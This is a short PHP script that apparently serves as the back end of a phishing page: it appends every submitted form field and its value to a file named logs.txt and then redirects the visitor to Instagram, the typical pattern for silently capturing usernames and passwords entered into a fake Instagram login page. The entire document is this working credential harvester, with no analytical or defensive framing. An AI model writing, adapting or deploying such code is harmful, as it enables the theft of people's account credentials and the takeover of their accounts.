<?php
header("Location: www.instagram.com");
$file = fopen("logs.txt","a");
foreach($_POST as $variable => $value){
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}
fwrite($file, "\r\n");
fclose($file);
exit;
?>
